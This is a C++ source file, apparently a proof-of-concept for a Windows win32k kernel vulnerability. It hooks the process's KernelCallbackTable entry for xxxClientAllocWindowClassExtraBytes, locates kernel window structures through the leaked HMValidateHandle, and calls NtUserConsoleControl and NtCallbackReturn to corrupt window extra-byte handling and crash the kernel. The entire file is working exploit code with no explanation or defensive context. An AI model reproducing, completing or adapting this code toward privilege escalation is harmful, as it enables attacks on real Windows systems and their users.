// crash_poc.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <windows.h>
#include <iostream>
using namespace std;


#define GET_HWND_FRMO_HEAP_METHOD_NUMBER 0//1-->Heap Spary   0-->VirtualQuery

/* Console commands for NtUserConsoleControl */
typedef enum _CONSOLECONTROL
{
	ConsoleCtrlDesktopConsoleThread = 0,
	GuiConsoleWndClassAtom = 1,
	ConsoleMakePalettePublic = 5,
	ConsoleAcquireDisplayOwnership,
} CONSOLECONTROL, * PCONSOLECONTROL;

typedef enum _CONSOLECONTROL CONSOLECONTROL;


HMODULE HMODULE_User32 = 0;
BOOL IsCrash = FALSE;
HWND __hWnd = 0;
ATOM _Atom1 = 0;
ATOM _Atom2 = 0;
ULONGLONG __Offset = 0;
WORD __randnum_0x1234_1 = 0;




HWND hWndArr[10] = { 0 };
#if GET_HWND_FRMO_HEAP_METHOD_NUMBER
PVOID phWnd[10] = { 0 };
#else
PVOID __BaseAddress = NULL;
SIZE_T __RegionSize = 0;
#endif


typedef BOOL (*pfn_IsMenu)(HMENU hMenu);
typedef NTSTATUS(__fastcall* pfn_NtUserConsoleControl)(CONSOLECONTROL, PVOID, ULONG);
typedef NTSTATUS(__fastcall* pfn_NtCallbackReturn)(PVOID, ULONG, NTSTATUS);
typedef PVOID(__fastcall* pfn_xxxClientAllocWindowClassExtraBytes)(ULONG*);
typedef PVOID(__fastcall* pfn_HMValidateHandle)(HANDLE, UINT);

pfn_NtUserConsoleControl NtUserConsoleControl = NULL;
pfn_NtCallbackReturn NtCallbackReturn = NULL;
pfn_xxxClientAllocWindowClassExtraBytes __Origin_USER32_xxxClientAllocWindowClassExtraBytes = NULL;
pfn_HMValidateHandle _HMValidateHandle = NULL;



HWND GethWndFromHeap()
{
	HWND TargethWnd = NULL;


#if GET_HWND_FRMO_HEAP_METHOD_NUMBER
	for (int i = 2; i < 10; i++)
	{
		ULONG cbWndExtra = *(ULONG*)((char*)(phWnd[i]) + 0xC8);
		printf("cbWndExtra = %d !!\n", cbWndExtra);
		if (cbWndExtra == __randnum_0x1234_1)
		{
			TargethWnd = (HWND) * (ULONG_PTR*)(phWnd[i]);
			break;
		}
	}
#else
	PVOID qwBaseAddressBak = __BaseAddress;
	ULONGLONG Travel = (ULONGLONG)__BaseAddress;
	DWORD RegionSize = __RegionSize;

	do
	{
		while (*(WORD*)Travel != __randnum_0x1234_1 && __RegionSize > 0)
		{
			Travel += 2;

			__RegionSize--;
		}

		if (*(DWORD*)((DWORD*)Travel + (0x18 >> 2) - (0xc8 >> 2)) != 0x8000000)
		{
			Travel = Travel + 4;
			ULONGLONG temp = (ULONGLONG)__BaseAddress - Travel;
			__RegionSize = RegionSize + temp;
		}


		TargethWnd = (HWND) * (DWORD*)(Travel - 0xc8);


		if (TargethWnd)
		{
			break;
		}

	} while (true);
#endif
	return TargethWnd;
}


PVOID __fastcall _Fake_USER32_xxxClientAllocWindowClassExtraBytes(ULONG* a1)
{

	PVOID v7; // [rsp+30h] [rbp-28h] BYREF
	if ((IsCrash == TRUE )&&( (*a1) == __randnum_0x1234_1))
	{
		__hWnd = GethWndFromHeap();
		NtUserConsoleControl(ConsoleAcquireDisplayOwnership, &__hWnd,0x10);     // ConsoleAcquireDisplayOwnership  change this hwnd kernel structure to |0x800

		__Offset = (ULONGLONG)HeapAlloc(GetProcessHeap(), 0x8, *a1);
		v7 = &__Offset;

		NtCallbackReturn(v7, 0x18, 0);
	}
	return __Origin_USER32_xxxClientAllocWindowClassExtraBytes(a1);
}

LRESULT __fastcall WindowProc(HWND a1, UINT a2, WPARAM a3, LPARAM a4)
{
	if (a2 != 2)
		return DefWindowProcW(a1, a2, a3, a4);
	PostQuitMessage(0);
	return 0;
}

BOOL Init()
{
	HMODULE HMODULE_User32=0; // rax
	int v2; // edx
	__int64 v3; // rcx
	__int64 result; // rax
	DWORD64 v5; // rbx
	HLOCAL mem_zeroinit_8; // rax
	ULONG* mem_zeroinit_200h; // r10
	HLOCAL mem_zeroinit_8_; // r8
	__int64 mem_zeroinit_30h; // rdx
	__int64 mem_zeroinit_4; // r9
	LONG_PTR mem_zeroinit_A0h; // r11
	unsigned __int64 v12; // rax
	unsigned __int64 Offset_28; // rcx
	bool v14; // zf
	unsigned __int64 Offset_98; // rcx
	WNDCLASSEXW WndClassExW = { 0 }; // [rsp+20h] [rbp-68h] BYREF
	DWORD flOldProtect; // [rsp+70h] [rbp-18h] BYREF

	HMODULE_User32 = GetModuleHandleA("User32.dll");
	pfn_IsMenu IsMenu = (pfn_IsMenu)GetProcAddress(HMODULE_User32, "IsMenu");
	v2 = 0;
	v3 = 0;
	while (*((BYTE*)IsMenu + v3) != 0xE8)
	{
		++v2;
		if (++v3 >= 0x15)
			return FALSE;
	}
	_HMValidateHandle = (pfn_HMValidateHandle)((char*)IsMenu
		+ v2
		+ (__int64)*(int*)((char*)IsMenu + v2 + 1)
		+ 5);
	::IsMenu(0);
	v5 = __readgsqword(0x60);
	ULONGLONG KernelCallbackTable = *(ULONGLONG*)((char*)v5 + 0x58);

	__Origin_USER32_xxxClientAllocWindowClassExtraBytes = (pfn_xxxClientAllocWindowClassExtraBytes)(*(ULONGLONG*)((char*)KernelCallbackTable +0x7B*8));// USER32!_xxxClientAllocWindowClassExtraBytes

	VirtualProtect((char*)KernelCallbackTable + 0x7B * 8, 0x300, 0x40, &flOldProtect);
	*((PVOID*)KernelCallbackTable + 0x7B) = _Fake_USER32_xxxClientAllocWindowClassExtraBytes;
	VirtualProtect((char*)KernelCallbackTable + 0x7B * 8, 0x300, flOldProtect, &flOldProtect);

	srand(time(0));

	__randnum_0x1234_1 = (rand() % 255 + 0x1234) | 1;


	WndClassExW.hIcon = 0;
	WndClassExW.hbrBackground = 0;
	WndClassExW.lpszClassName = 0;
	WndClassExW.lpfnWndProc = (WNDPROC)WindowProc;
	WndClassExW.cbSize = 80;
	WndClassExW.style = 3;
	WndClassExW.cbClsExtra = 0;
	WndClassExW.cbWndExtra = __randnum_0x1234_1;
	WndClassExW.hInstance = GetModuleHandleW(0);
	WndClassExW.lpszClassName = L"Class1";
	_Atom1 = RegisterClassExW(&WndClassExW);


	WndClassExW.cbWndExtra = 32;
	WndClassExW.lpszClassName = L"Class2";
	_Atom2 = RegisterClassExW(&WndClassExW);
	CreatePopupMenu();
	result = 1;
	return result;
}

int main()
{
	HMODULE v20 = 0;
	HMODULE v21 = 0;

	_MEMORY_BASIC_INFORMATION Buffer;

	Buffer.BaseAddress = 0;
	Buffer.AllocationBase = 0;
	*(ULONGLONG*)&Buffer.AllocationProtect = 0;
	Buffer.RegionSize = 0;
	*(ULONGLONG*)&Buffer.State = 0;
	*(ULONGLONG*)&Buffer.Type = 0;
	v20 = GetModuleHandleA("win32u.dll");
	v21 = GetModuleHandleA("ntdll.dll");
	if (!v20 || !v21)
	{
		printf("Error 0 !!\n");
		return 0;
	}

	NtUserConsoleControl = (pfn_NtUserConsoleControl)GetProcAddress(v20, "NtUserConsoleControl");
	NtCallbackReturn = (pfn_NtCallbackReturn)GetProcAddress(v21, "NtCallbackReturn");

	if (!Init()||!NtUserConsoleControl || !NtCallbackReturn )
	{
		printf("Error 1 !!\n");
		return 0;
	}


	
	for (int i=0;i<10;i++)
	{
		IsCrash = TRUE;
		HINSTANCE hInstance = GetModuleHandleW(0);
		HMENU hMenu = CreateMenu();
		
		HWND v5 = CreateWindowExW(
			0x8000000u,
			(LPCWSTR)(unsigned __int16)_Atom2,
			L"somewnd",
			0x8000000u,
			0,
			0,
			0,
			0,
			0,
			hMenu,
			hInstance,
			0);

		if (!v5)
		{
			printf("Error 2 !!  %d\n",GetLastError());
			return 0;
		}

		if (!_HMValidateHandle)
		{
			printf("Error 4 !!\n");
			return 0;
		}

		
		PVOID v6 = _HMValidateHandle(v5, 1);
		

#if GET_HWND_FRMO_HEAP_METHOD_NUMBER
		hWndArr[i] = v5;
		phWnd[i] = v6;
#else
		VirtualQuery(v6, &Buffer, 0x30);

		if (__BaseAddress==NULL)
		{
			__BaseAddress = Buffer.BaseAddress;
			__RegionSize = Buffer.RegionSize;
		}
		else
		{
			if (__BaseAddress>=Buffer.BaseAddress)//???
			{
				__BaseAddress = Buffer.BaseAddress;
				__RegionSize = Buffer.RegionSize;
			}
		}
#endif
		
	}

	for (int i=2;i<10;i++)
	{
		if (hWndArr[i])
		{
			DestroyWindow(hWndArr[i]);
		}
	}

	HINSTANCE v17 = (HINSTANCE)GetModuleHandleW(0);
	HMENU v18 = CreateMenu();

	HWND v7 = CreateWindowExW(
		0x8000000u,
		(LPCWSTR)(unsigned __int16)_Atom1,
		L"crashwnd",
		0x8000000u,
		0,
		0,
		0,
		0,
		0,
		v18,
		v17,
		0);
	if (v7)
	{
		DestroyWindow(v7);
	}
	return 0;
}

